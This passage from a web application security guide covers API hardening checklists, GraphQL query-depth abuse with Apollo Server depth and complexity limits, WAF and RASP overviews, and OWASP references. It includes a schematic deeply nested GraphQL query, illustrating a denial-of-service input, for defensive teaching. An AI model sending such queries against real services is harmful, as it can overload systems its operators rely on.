  □ Reject unexpected fields (strict schema)
  □ Limit request body size
  □ Limit query complexity (pagination, depth)

Output:
  □ Never return more data than needed
  □ Filter sensitive fields from responses
  □ Consistent error format (no stack traces)
  □ Pagination for list endpoints

Transport:
  □ HTTPS only (HSTS)
  □ TLS 1.2+ (prefer 1.3)
  □ Certificate pinning for mobile clients (optional)

Rate Limiting:
  □ Per-user or per-API-key limits
  □ Return 429 with Retry-After header
  □ Separate limits for auth endpoints (stricter)
  □ Consider sliding window algorithm
```

### 10.2 GraphQL-Specific Concerns

```graphql
# Query depth attack:
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            # ... N levels deep → exponential DB queries
          }
        }
      }
    }
  }
}

# Defense: limit query depth and complexity
# graphql-depth-limit / graphql-query-complexity
```

```javascript
// Apollo Server with depth and complexity limits:
const depthLimit = require('graphql-depth-limit');
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [
        depthLimit(5),
        createComplexityLimitRule(1000),
    ],
});
```

---

## 11. Security Monitoring and Incident Response

### 11.1 Web Application Firewall (WAF)

```
WAF sits in front of the application:

  Client → WAF → Application
              │
              ├── Block known attack patterns (SQLi, XSS)
              ├── Rate limiting
              ├── Bot detection
              ├── IP reputation
              └── Virtual patching (block CVE exploit before code fix)

Common WAF solutions:
  - AWS WAF (managed rules + custom rules)
  - Cloudflare WAF
  - ModSecurity (open-source, Apache/Nginx module)
  - Fastly Next-Gen WAF (Signal Sciences)

Limitations:
  - Can be bypassed with encoding tricks
  - False positives block legitimate users
  - Not a substitute for fixing vulnerabilities in code
  - Defense in depth: WAF + secure code + monitoring
```

### 11.2 Runtime Application Self-Protection (RASP)

```
RASP agent runs inside the application:
  - Intercepts function calls at runtime
  - Detects and blocks attacks in context
  - Example: detects SQLi by seeing tainted data reach SQL parser
  - Lower false positive rate than WAF (has application context)
  
Tools: Contrast Protect, Sqreen, RASP modules in commercial IAST
```

---

## References

- **OWASP Top 10 (2021)** — owasp.org/www-project-top-ten/
- **OWASP Cheat Sheet Series** — cheatsheetseries.owasp.org
- **OWASP Application Security Verification Standard (ASVS)** — owasp.org/www-project-application-security-verification-standard/
- **Content Security Policy spec** — W3C CSP Level 3
- **SameSite cookies** — web.dev/samesite-cookies-explained/
- **Semgrep documentation** — semgrep.dev/docs
- **OWASP ZAP** — zaproxy.org
- **CWE Top 25** — cwe.mitre.org/top25/
